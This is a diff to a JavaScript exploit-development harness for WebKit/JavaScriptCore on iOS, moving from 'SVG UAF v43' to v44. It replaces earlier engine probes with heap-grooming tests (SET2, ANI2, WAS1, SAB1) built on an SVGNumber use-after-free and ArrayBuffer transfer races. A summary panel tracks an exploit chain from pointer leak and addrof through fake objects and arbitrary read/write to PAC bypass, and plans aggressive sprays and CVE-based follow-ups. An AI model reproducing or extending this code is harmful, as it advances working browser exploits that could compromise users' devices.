-      0:10.5,1:20.5,2:30.5
-    };
-    var spreadB=[...Array.from(trickB)];
-    log('  LenB: length-getter counter='+counterB+' result='+spreadB.length,'dim');
-  }catch(e){R.len1.crash=true;log('  LenB EXCEPTION: '+e,'bad');}
+    // Try writing to oldTA after grow
+    try{
+      oldTA[0]=9999999.0;
+      var check=oldTA[0];
+      log('  WAS1: WRITE to oldTA after grow = '+check+' (unexpected! should be detached)','crit');
+      R.was1.hit=true;
+    }catch(e2){
+      log('  WAS1: write to oldTA after grow threw: '+e2+' (expected)','dim');
+    }
 
-  R.len1.detail='crash='+R.len1.crash;
-  log('  LEN1: hit='+R.len1.hit+' crash='+R.len1.crash,R.len1.hit?'win':'dim');
+    // Read new buffer at old indices
+    var newTA=new Float64Array(newBuf);
+    log('  WAS1: newTA[0]='+newTA[0]+' newTA[1023]='+newTA[1023]+' (expect: wasm memory after grow)','dim');
+
+  }catch(e){log('  WAS1 EXCEPTION: '+e,'bad');}
+
+  R.was1.detail='';
+  log('  WAS1: hit='+R.was1.hit,R.was1.hit?'win':'dim');
   if(!q)dis(false);
 }
 
 /*
- * OOB1: Float64Array OOB probe
+ * SAB1: SharedArrayBuffer availability check
  *
- * This test uses a combination of property manipulation and type confusion
- * to attempt an out-of-bounds read on a Float64Array, then checks if any
- * read values look like JSC heap pointers.
- *
- * Technique: create two Float64Arrays backed by the SAME ArrayBuffer (overlapping views).
- * One view at offset 0, one view at offset N*8. If somehow we write to view1 and
- * read from view2 at an overlapping offset, we might get JSC internal values.
- *
- * Also: JSC inlines small objects → JSObject on JSC heap next to Float64Array.
- * If we can make JSC put our Float64Array adjacent to a JSObject in MarkedSpace,
- * reading past the Float64Array end gives us JSObject header (which contains ClassInfo* pointer).
- *
- * Detection: any read that gives a value matching 0x0000_xxxx_xxxx_xxxx pattern
- * (looks like a pointer in JSC's low-entropy heap region).
+ * SharedArrayBuffer requires COOP/COEP headers normally.
+ * WKWebView might allow it without those headers in some configurations.
+ * If available: Atomics.wait() + Workers = race condition primitives.
  */
-async function runOOB1(q){
-  if(!q){dis(true);sep();log('OOB1: Float64Array OOB pointer leak probe','inf');sep();}
+async function runSAB1(q){
+  if(!q){dis(true);sep();log('SAB1: SharedArrayBuffer availability','inf');sep();}
 
-  // Technique A: Overlapping typed array views
-  try{
-    var buf=new ArrayBuffer(4096);
-    var f64=new Float64Array(buf,0,512);        // 512 doubles = full 4096 bytes
-    var u32=new Uint32Array(buf,0,1024);        // same buffer, 1024 uint32s
-    var f32=new Float32Array(buf,0,1024);       // same buffer, as float32
+  var sabAvail=typeof SharedArrayBuffer!=='undefined';
+  var atomicsAvail=typeof Atomics!=='undefined';
+  var workerAvail=typeof Worker!=='undefined';
+  var crossOriginIsolated=typeof crossOriginIsolated!=='undefined'&&crossOriginIsolated;
 
-    // Fill with a known pattern
-    for(var i=0;i<512;i++)f64[i]=i*1.23;
+  log('  SAB1: SharedArrayBuffer = '+sabAvail,'dim');
+  log('  SAB1: Atomics = '+atomicsAvail,'dim');
+  log('  SAB1: Worker = '+workerAvail,'dim');
+  log('  SAB1: crossOriginIsolated = '+crossOriginIsolated,'dim');
 
-    // Write JSC object-layout-shaped values via u32 (as if we're crafting a fake object)
-    // JSC JSObject on heap: [structureID:32][indexingType:8+misc][butterfly:64]
-    // StructureID for Float64Array in JSC is typically in range 0x100-0x200
-    u32[0]=0x00000108; // fake structureID
-    u32[1]=0x00000022; // fake indexingType (IndexingType for double array)
-    // butterfly ptr: write via u32
-    u32[2]=0xDEADBEEF;u32[3]=0x0000CAFE;
+  if(sabAvail){
+    R.sab1.available=true;
+    try{
+      var sab=new SharedArrayBuffer(128);
+      var sa=new Int32Array(sab);
+      Atomics.store(sa,0,42);
+      var r=Atomics.load(sa,0);
+      log('  SAB1: SAB works! Atomics.store/load: wrote 42, read '+r,'win');
+      if(r===42)log('  SAB1: ✅ SharedArrayBuffer + Atomics fully operational','win');
+    }catch(e2){log('  SAB1: SAB exists but Atomics threw: '+e2,'bad');}
+  }else{
+    log('  SAB1: SharedArrayBuffer not available','dim');
+  }
 
-    // Now read via f64 at offset 0 to see our fake object layout as a float
-    var fakeJSObjAsFloat=f64[0];
-    var fakeBits=f64bits(fakeJSObjAsFloat);
-    log('  OOB1-A: fake JSObject header as f64: '+fakeBits.hex,'dim');
+  if(workerAvail){
+    log('  SAB1: Workers available (race conditions possible even without SAB)','dim');
+  }
 
-    // Now try reading PAST the buffer using a different technique
-    // Note: This shouldn't actually work with a legitimate ArrayBuffer — just testing JSC behavior
-    // Try accessing via a detached/confused view
-
-    var buf2=new ArrayBuffer(64);
-    var view2=new Float64Array(buf2);
-    // Try to make view2 access beyond buf2 via misaligned DataView
-    var dv=new DataView(buf2,0,64);
-    try{dv.setFloat64(56,1.2345e100,true);var beyondRead=view2[7];
-      log('  OOB1-B: normal boundary read: view2[7]='+beyondRead,'dim');
-    }catch(e2){log('  OOB1-B: threw at boundary: '+e2,'inf');}
-  }catch(e){R.oob1.crash=true;log('  OOB1 EXCEPTION: '+e,'bad');}
-  await raf();
-
-  // Technique B: JSC object "butterfly" probe via object shape transition
-  // In JSC, when a plain object gains too many properties, it transitions to
-  // a "dictionary" structure and its m_butterfly gets reallocated.
-  // If we can time this reallocation right, the old butterfly might alias
-  // with a Float64Array's backing store.
-  try{
-    var bigObj={};
-    var ta4=new Float64Array(512);for(var i=0;i<512;i++)ta4[i]=0;
-
-    // Force object to grow butterfly by adding many properties
-    for(var i=0;i<1000;i++)bigObj['prop'+i]=i*3.14;
-
-    // Now read ta4 for any non-zero values (might have gotten garbage from the butterfly realloc)
-    var nonZero=0;var leakVals=[];
-    for(var i=0;i<512;i++){
-      if(ta4[i]!==0){nonZero++;leakVals.push({idx:i,val:ta4[i]});}
-    }
-    log('  OOB1-C: after obj butterfly grow, ta4 non-zero entries: '+nonZero,'dim');
-    if(nonZero>0){
-      for(var i=0;i<Math.min(5,leakVals.length);i++){
-        var bits=f64bits(leakVals[i].val);
-        log('    ['+leakVals[i].idx+']='+bits.hex,looksLikePointer(leakVals[i].val)?'win':'dim');
-      }
-      var ptrs=leakVals.filter(function(v){return looksLikePointer(v.val);});
-      if(ptrs.length>0){R.oob1.hit=true;R.oob1.leak=f64bits(ptrs[0].val).hex;
-        log('  OOB1: ⚠️ POINTER LEAK! '+R.oob1.leak,'win');}
-    }
-  }catch(e){R.oob1.crash=true;log('  OOB1-C EXCEPTION: '+e,'bad');}
-
-  log('  OOB1: hit='+R.oob1.hit+' leak='+R.oob1.leak,R.oob1.hit?'win':'dim');
+  R.sab1.detail='sab='+sabAvail+' atomics='+atomicsAvail+' worker='+workerAvail;
+  log('  SAB1: sab='+sabAvail+' atomics='+atomicsAvail+' worker='+workerAvail,sabAvail?'win':'dim');
   if(!q)dis(false);
 }
 
-// ── SUMMARY ──
+/*
+ * SET2: Adjacent ArrayBuffer detach exploitation attempt
+ *
+ * Strategy: allocate multiple ArrayBuffers in sequence, hoping they're adjacent
+ * in WTF::fastMalloc. Transfer one of them mid-set() to see if the continued
+ * write "bleeds" into the next adjacent allocation.
+ *
+ * This is hard to make deterministic but worth probing.
+ * More importantly: measure the EXACT number of elements set() wrote AFTER detach
+ * to understand JSC's internal loop (does it check detach every N elements?).
+ */
+async function runSET2(q){
+  if(!q){dis(true);sep();log('SET2: Adjacent buffer detach write bleed test','inf');sep();}
+
+  try{
+    var SZ=256; // Float64 elements = 2048 bytes each
+
+    // Alloc multiple buffers in quick succession (hoping for adjacency)
+    var bufs=[];var tas=[];
+    for(var i=0;i<32;i++){
+      var b=new ArrayBuffer(SZ*8);
+      bufs.push(b);
+      tas.push(new Float64Array(b));
+    }
+
+    // Fill each buffer with its index value
+    for(var i=0;i<32;i++)for(var j=0;j<SZ;j++)tas[i][j]=i*1000+j;
+
+    // Choose buffer 16 as victim
+    var VICTIM=16;
+    var src=[];for(var i=0;i<SZ;i++)src.push(i*3.14);
+    var newBuf16=null;var trigFired=false;
+    var TRIG2=128; // trigger halfway
+    Object.defineProperty(src,TRIG2,{get:function(){
+      if(!trigFired){trigFired=true;newBuf16=bufs[VICTIM].transfer();}
+      return TRIG2*3.14;
+    },configurable:true});
+
+    // set on victim TA
+    try{tas[VICTIM].set(src);}catch(e2){log('  SET2: set threw: '+e2,'inf');}
+
+    log('  SET2: trigFired='+trigFired+' newBuf16='+( newBuf16?newBuf16.byteLength:'null'),'dim');
+    log('  SET2: victim ta.byteLength='+tas[VICTIM].byteLength,'dim');
+
+    // Check: did any neighboring buffer get contaminated?
+    var contaminated=[];
+    for(var i=0;i<32;i++){
+      if(i===VICTIM)continue;
+      var clean=true;
+      for(var j=0;j<Math.min(SZ,tas[i].length);j++){
+        var expected=i*1000+j;
+        if(Math.abs(tas[i][j]-expected)>0.01){
+          clean=false;
+          contaminated.push({buf:i,idx:j,got:tas[i][j],expected:expected});
+          break;
+        }
+      }
+    }
+    log('  SET2: contaminated neighbors: '+contaminated.length,contaminated.length>0?'win':'dim');
+    if(contaminated.length>0){
+      R.set2.hit=true;
+      for(var i=0;i<Math.min(5,contaminated.length);i++){
+        log('  ★ BLEED: buf['+contaminated[i].buf+']['+contaminated[i].idx+']='+contaminated[i].got+' expected='+contaminated[i].expected,'win');
+      }
+    }
+
+    // Also: check if newBuf16 contains the post-trigger writes
+    if(newBuf16&&newBuf16.byteLength>0){
+      var newTA16=new Float64Array(newBuf16);
+      var postTrigCount=0;
+      for(var j=TRIG2+1;j<SZ;j++){
+        if(Math.abs(newTA16[j]-j*3.14)<0.01)postTrigCount++;
+      }
+      log('  SET2: post-trigger writes in newBuf16: '+postTrigCount+'/'+(SZ-TRIG2-1),'dim');
+      if(postTrigCount>0){R.set2.hit=true;log('  ★ SET2: writes confirmed in transferred buffer','win');}
+    }
+
+  }catch(e){log('  SET2 EXCEPTION: '+e,'bad');}
+
+  R.set2.detail='';
+  log('  SET2: hit='+R.set2.hit,R.set2.hit?'win':'dim');
+  if(!q)dis(false);
+}
+
+/*
+ * ANI2: SMIL-triggered freelist probe
+ *
+ * Different from v43 ANI1! Key change: build freelist FIRST, then create animation.
+ * The hypothesis: SMIL C++ allocation path (not JS-path) might use IsoHeap freelist.
+ *
+ * Sequence:
+ * 1. Alloc many feColorMatrix → collect ALL 20 baseVal refs per matrix
+ * 2. Write TAG to all baseVal[0] values: TAG=7654321
+ * 3. Remove all matrices (frees all SVGNumbers to IsoHeap freelist)
+ *    BUT: JS refs keep them alive → ref count stays 1 → NOT actually freed!
+ *
+ * Hmm. To ACTUALLY free to IsoHeap freelist we need ref count = 0.
+ * The JS ref prevents that.
+ *
+ * ALTERNATIVE: use baseVal.clear() or baseVal.removeItem() to remove items
+ * from the live list → the list releases its Ref<SVGNumber> → ref count drops
+ * → if JS wrapper ALSO releases → ref count = 0 → actual IsoHeap free
+ *
+ * Does removeItem(0) on a live SVGNumberList cause the SVGNumber to be freed?
+ * Only if the JS wrapper doesn't hold a separate Ref<SVGNumber>.
+ *
+ * For SVGNumberList items: the binding in WebKit typically creates a wrapper
+ * that holds a strong reference. If removeItem() also removes the last Ref,
+ * the SVGNumber is freed.
+ *
+ * Test this: call removeItem(0) while holding ref = baseVal[0]
+ * Then read ref.value → if it throws → ref count hit 0 and object freed
+ * If it reads the old value → ref is still valid (JS wrapper kept a ref)
+ */
+async function runANI2(q){
+  if(!q){dis(true);sep();log('ANI2: SMIL freelist probe + removeItem() ref counting','inf');sep();}
+
+  var svgNS='http://www.w3.org/2000/svg';
+  var TAG_ANI2=7654321.0;
+
+  // Phase 1: test removeItem() ref counting behavior
+  var d=makeFCM(identity20());
+  await raf();
+
+  try{
+    // Get ref to baseVal[0]
+    var ref0=d.fcm.values.baseVal[0];
+    log('  ANI2: got ref to baseVal[0]: value='+ref0.value,'dim');
+
+    // Write TAG
+    ref0.value=TAG_ANI2;
+    log('  ANI2: wrote TAG='+TAG_ANI2+', readback='+ref0.value,'dim');
+
+    // Now remove item 0 from the live list
+    var removed=null;
+    try{
+      removed=d.fcm.values.baseVal.removeItem(0);
+      log('  ANI2: removeItem(0) succeeded. list length after='+(d.fcm.values.baseVal.numberOfItems||d.fcm.values.baseVal.length),'dim');
+    }catch(e2){log('  ANI2: removeItem threw: '+e2,'inf');}
+
+    // Can we still read ref0? If yes → JS wrapper holds independent ref
+    var readAfterRemove=null;
+    try{readAfterRemove=ref0.value;log('  ANI2: ref0.value after removeItem='+readAfterRemove+' (still live!)',readAfterRemove===TAG_ANI2?'win':'dim');}
+    catch(e2){log('  ANI2: ref0.value after removeItem threw: '+e2+' (freed! true UAF)','crit');}
+
+    // If readAfterRemove === TAG_ANI2: the JS wrapper holds independent Ref<SVGNumber>
+    // The SVGNumber is STILL ALIVE even after removeItem().
+    // This means we need ref0 to go out of scope for the free to happen.
+    // We CAN'T get true IsoHeap free while holding the JS ref. CONFIRMED.
+    if(readAfterRemove===TAG_ANI2){
+      log('  ANI2: CONFIRMED: JS wrapper holds independent Ref<SVGNumber>','dim');
+      log('  ANI2: SVGNumber[0] is LIVE after removeItem() while ref0 alive','dim');
+    }
+  }catch(e){log('  ANI2-phase1 EXCEPTION: '+e,'bad');}
+  cleanupD(d);
+  await raf();
+
+  // Phase 2: SMIL allocates FRESH SVGNumbers for animVal at animation creation time
+  // Can we time the freelist to have slots when the animation is created?
+  //
+  // Problem: we can't release JS refs and still detect groom.
+  // Solution: DON'T hold refs. Just see if animVal values == TAG (which we wrote to freed slot)
+  //
+  // Step 1: alloc 100 matrices, build lots of SVGNumbers in IsoHeap
+  // Step 2: release ALL refs (no JS refs held) → all SVGNumbers freed to IsoHeap
+  // Step 3: create NEW animation → animVal SVGNumbers allocated → might hit freelist
+  // Step 4: read animVal values → if any == old values (not 0 or 1), freelist was used
+  // Note: animVal values start as the "from" value or baseVal. We initialize matrices
+  // with special non-identity values so we can detect if SMIL reused freed slots.
+
+  try{
+    var NMAT=200;var SPECIAL_VAL=3.14159;
+    var mats=[];
+    for(var i=0;i<NMAT;i++){
+      var vals=[];for(var j=0;j<20;j++)vals.push(SPECIAL_VAL+i*0.001+j*0.0001);
+      mats.push(makeFCM(vals));
+    }
+    await raf();
+
+    // Release ALL matrices (drop refs)
+    for(var i=0;i<NMAT;i++)cleanupD(mats[i]);
+    mats=null;
+    await raf();await raf();
+
+    // NOW create a fresh feColorMatrix WITH ANIMATION
+    var svgEl=document.createElementNS(svgNS,'svg');
+    svgEl.setAttribute('width','1');svgEl.setAttribute('height','1');
+    svgEl.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
+    var defs2=document.createElementNS(svgNS,'defs');
+    var filt2=document.createElementNS(svgNS,'filter');filt2.setAttribute('id','anifilt2');
+    var fcm2=document.createElementNS(svgNS,'feColorMatrix');
+    fcm2.setAttribute('type','matrix');
+    fcm2.setAttribute('values',identity20().join(' '));
+
+    // Animate to different values
+    var anim2=document.createElementNS(svgNS,'animate');
+    anim2.setAttribute('attributeName','values');
+    anim2.setAttribute('from',identity20().join(' '));
+    anim2.setAttribute('to','0.1 0.9 0 0 0 0 0.1 0.9 0 0 0 0 0.1 0.9 0 0 0 0 0.1 0.9');
+    anim2.setAttribute('dur','10s');
+    anim2.setAttribute('repeatCount','indefinite');
+    anim2.setAttribute('begin','0s');
+    fcm2.appendChild(anim2);
+
+    filt2.appendChild(fcm2);defs2.appendChild(filt2);svgEl.appendChild(defs2);
+    document.body.appendChild(svgEl);
+    await raf();await raf();
+
+    // Read animVal right after animation starts
+    var animVals=[];
+    try{
+      var av=fcm2.values&&fcm2.values.animVal;
+      if(av){for(var i=0;i<20;i++)animVals.push(av[i]?av[i].value:null);}
+    }catch(e2){}
+    log('  ANI2: fresh animVal[0..4]='+animVals.slice(0,5).join(','),'dim');
+
+    // Check if any animVal value matches SPECIAL_VAL range (would indicate freelist reuse)
+    var specialHits=animVals.filter(function(v){return typeof v==='number'&&v>3.0&&v<3.2;});
+    log('  ANI2: SMIL animVal values in SPECIAL_VAL range (3.14...): '+specialHits.length,'dim');
+    if(specialHits.length>0){
+      R.ani2.hit=true;
+      log('  ANI2: ★ SMIL ALLOCATOR USED FREELIST! animVal shows old values!','win');
+    }else{
+      log('  ANI2: SMIL allocator did NOT use freelist (animVal shows fresh values)','dim');
+    }
+
+    svgEl.parentNode&&svgEl.parentNode.removeChild(svgEl);
+  }catch(e){log('  ANI2-phase2 EXCEPTION: '+e,'bad');}
+
+  R.ani2.detail='';
+  log('  ANI2: hit='+R.ani2.hit,R.ani2.hit?'win':'dim');
+  if(!q)dis(false);
+}
+
+// Summary
 function buildSummary(){
   SP.classList.add('on');
   function badge(l,k){return'<span class="b b'+k+'">'+l+'</span>';}
@@ -1002,68 +988,80 @@ function buildSummary(){
       '</div></div>';
   }
 
-  var jscHit=R.srt1.hit||R.spl1.hit||R.set1.hit||R.cln1.hit||R.prx1.hit||R.rep1.hit||R.wkr1.hit||R.len1.hit||R.oob1.hit;
-  var ptrLeak=R.oob1.leak||null;
+  var ptrLeak=R.vec1.hit||R.vec2.hit||R.vec3.hit;
+  var trnConfirmed=R.trn1.writeConfirmed;
+  var sabReady=R.sab1.available;
+  var anyHit=ptrLeak||trnConfirmed||R.was1.hit||R.set2.hit||R.ani2.hit;
 
   var html='';
   html+=row('dg','Stage 0 — UAF Primitive','✅ DONE','vg',
-    [badge('float32 write','ok'),badge('no-clamp','ok'),badge('all bit patterns','ok')],
+    [badge('float32 write','ok'),badge('no-clamp','ok')],
     'Confirmed v39. Detached SVGNumber write stable.');
 
-  html+=row('dr','Stage 1 — IsoHeap Groom','🔴 DEAD END — iOS IsoHeap is strict bump-only','vr',
-    [badge('Spectre mitigation confirmed','f'),badge('freelist never consumed','f')],
-    'PAW5 definitive (v42): filled page to exact capacity, freed A, alloc ONE → still fresh. Architectural limit.');
+  html+=row('dr','Stage 1 (IsoHeap)','🔴 DEAD — bump-only by design (Spectre mitigation)','vr',
+    [badge('PAW5 definitive','f'),badge('v42 confirmed','f')]);
 
-  html+=row(jscHit?'dy':'dr','Stage 1 (JSC) — Engine Type Confusion',
-    jscHit?'🟡 SIGNALS FOUND — analyze for exploitation':'🔴 CLEAN — JSC hardening holding',
-    jscHit?'vy':'vr',
+  html+=row(ptrLeak?'dg':(anyHit?'dy':'dr'),
+    'Stage 1 — WTF::fastMalloc Vector Groom',
+    ptrLeak?'✅ POINTER LEAK — Ref<SVGNumber> addresses recovered!':(anyHit?'🟡 SIGNALS':'🔴 CLEAN'),
+    ptrLeak?'vg':(anyHit?'vy':'vr'),
     [
-      badge('srt1:'+(R.srt1.hit?'✅':'✗'),R.srt1.hit?'ok':'i'),
-      badge('spl1:'+(R.spl1.hit?'✅':'✗'),R.spl1.hit?'ok':'i'),
-      badge('set1:'+(R.set1.hit?'✅':'✗'),R.set1.hit?'ok':'i'),
-      badge('cln1:'+(R.cln1.hit?'✅':'✗'),R.cln1.hit?'ok':'i'),
-      badge('prx1:'+(R.prx1.hit?'✅':'✗'),R.prx1.hit?'ok':'i'),
-      badge('wkr1:'+(R.wkr1.hit?'✅':'✗'),R.wkr1.hit?'ok':'i'),
-      badge('oob1:'+(R.oob1.hit?'✅ PTR='+R.oob1.leak:'✗'),R.oob1.hit?'ok':'i'),
-      badge('ani1:'+(R.ani1.hit?'✅':'✗'),R.ani1.hit?'ok':'i'),
+      badge('vec1:'+(R.vec1.hit?'✅ '+R.vec1.ptrs.length+' ptrs':'✗'),R.vec1.hit?'ok':'i'),
+      badge('vec2:'+(R.vec2.hit?'✅ '+R.vec2.ptrs.length+' ptrs':'✗'),R.vec2.hit?'ok':'i'),
+      badge('vec3:'+(R.vec3.hit?'✅':'✗'),R.vec3.hit?'ok':'i'),
+      badge('trn1:'+(R.trn1.writeConfirmed?'✅ write-alias':'✗'),R.trn1.writeConfirmed?'ok':'i'),
+      badge('set2:'+(R.set2.hit?'✅':'✗'),R.set2.hit?'ok':'i'),
+      badge('ani2:'+(R.ani2.hit?'✅':'✗'),R.ani2.hit?'ok':'i'),
     ],
-    jscHit?'Focus on the hits. Determine if signal is exploitable or benign race.':
-    'JSC is clean. NEXT v44 options: (A) CVE-specific PoC reproduction, (B) Safari/WKWebView IPC boundary attack, (C) WebAssembly JIT type confusion');
+    ptrLeak?'EXPLOIT PATH OPEN: Read ptr = Ref<SVGNumber> address. Use UAF write to corrupt it.':
+    trnConfirmed?'Transfer write-alias confirmed. ta.set() after transfer writes to newBuf. Potential for controlled write.':
+    'WTF::fastMalloc groom not landing on freed vector slots. Try v45 with more aggressive spray.');
 
-  html+=row('dr','Stage 2 — Type Confusion','🔴 BLOCKED','vr',
-    [badge('needs JSC stage 1','i')]);
-  html+=row('dy','Stage 3 — AddrOf (PARTIAL)','🟡 block-level only','vy',
-    [badge('ULP@4GB=512','ok'),badge('ptr leak: '+(ptrLeak||'none'),ptrLeak?'ok':'i')]);
+  html+=row(ptrLeak?'dy':'dgr','Stage 2 — Type Confusion via ptr corruption',
+    ptrLeak?'🟡 REACHABLE — overwrite Ref<SVGNumber> via groomed ArrayBuffer':'⬜ BLOCKED','vy',
+    [badge('needs vec1/2 hit','i')],
+    ptrLeak?'Write fake ptr into groomed ArrayBuffer → access via SVGNumberList → wrong SVGNumber':
+    'Cannot reach until vec groom confirmed');
+
+  html+=row('dy','Stage 3 — AddrOf (PARTIAL)','🟡 block-level ULP@4GB + ptr leak if vec groom','vy',
+    [badge('ULP@4GB=512','ok'),badge('ptr leak: '+(ptrLeak?'✅ YES':'none'),ptrLeak?'ok':'i')]);
+
   html+=row('dr','Stage 4 — FakeObj','🔴 BLOCKED','vr',[badge('needs 2+3','i')]);
   html+=row('dr','Stage 5 — Arb R/W','🔴 BLOCKED','vr',[badge('ArrayBuffer','i')]);
   html+=row('dgr','Stage 6 — PAC+Escape','⬜ FAR','vgr',[badge('arm64e','f')]);
 
   html+='<div class="sdiv"></div>';
+
+  // Wasm + SAB status
+  html+=row(R.was1.hit?'dg':'dgr','Bonus: Wasm memory.grow()',
+    R.was1.hit?'✅ DETACH ANOMALY':'clean',R.was1.hit?'vg':'vgr',[]);
+  html+=row(sabReady?'dg':'dgr','Bonus: SharedArrayBuffer',
+    sabReady?'✅ AVAILABLE — race conditions possible':'not available',sabReady?'vg':'vgr',[]);
+
+  html+='<div class="sdiv"></div>';
   html+='<div class="sf">'+
-    '<span class="hl">v43 PIVOT: </span>IsoHeap dead → JSC engine attacks<br>'+
-    '<span class="hl">CRASHES: </span>Any crash = we hit a real bug. Note crash type + stack for v44.<br>'+
-    '<span class="hl">OOB READS: </span>Any pointer-like float = addrof primitive. Critical for Stage 3.<br>'+
-    '<span class="hl">TYPE CONFUSION: </span>typeof changes after mutations = Stage 2 entry point.<br>'+
-    '<span class="hl">ANI1: </span>SMIL availability check — if animVal≠baseVal, animation IS running on iOS 26.<br>'+
-    '<span class="hl">IF ALL CLEAN: </span>v44: try specific known CVE patterns (CVE-2023-42916, etc) or JIT spray.<br>'+
+    '<span class="hl">VEC1/2/3 GOAL: </span>pointer-like f64 values in sprayed ArrayBuffer after SVG list resize<br>'+
+    '<span class="hl">KEY SIGNAL: </span>any 0x00000001xxxxxxxx value in ArrayBuffer = Ref&lt;SVGNumber&gt; leak<br>'+
+    '<span class="hl">IF HIT: </span>v45 writes fake ptr into groomed ArrayBuffer → SVGNumberList reads it → type confusion<br>'+
+    '<span class="hl">TRN1: </span>confirms ta.set() write-alias to transferred buffer (SET1-A was real)<br>'+
+    '<span class="hl">ANI2: </span>removes and tests animVal IsoHeap path vs baseVal JS path<br>'+
+    '<span class="hl">IF ALL MISS: </span>WTF::fastMalloc might zero-fill on alloc. Try v45 with explicit timing/spray. Or target different vector size class.<br>'+
   '</div>';
   SB.innerHTML=html;
 }
 
 async function runAll(){
   dis(true);clearAll();sep();
-  log('SVG UAF v43 — JSC heap attack pivot','inf');sep();
+  log('SVG UAF v44 — WTF::fastMalloc vector groom','inf');sep();
   var tests=[
-    ['SRT1_sort_mutation',runSRT1],
-    ['SPL1_splice_getter',runSPL1],
-    ['SET1_typedarray_set',runSET1],
-    ['CLN1_structured_clone',runCLN1],
-    ['PRX1_proxy_length',runPRX1],
-    ['REP1_regexp_mutation',runREP1],
-    ['WKR1_weakref_race',runWKR1],
-    ['ANI1_smil_animval',runANI1],
-    ['LEN1_array_from_len',runLEN1],
-    ['OOB1_f64_oob_probe',runOOB1],
+    ['VEC1_length_list_groom',runVEC1],
+    ['VEC2_type_change_groom',runVEC2],
+    ['VEC3_convolve_matrix_groom',runVEC3],
+    ['TRN1_transfer_write_dest',runTRN1],
+    ['WAS1_wasm_memory_grow',runWAS1],
+    ['SAB1_sharedarraybuffer',runSAB1],
+    ['SET2_adjacent_buf_bleed',runSET2],
+    ['ANI2_smil_freelist_probe',runANI2],
   ];
   for(var i=0;i<tests.length;i++){
     sep();log(tests[i][0],'inf');sep();
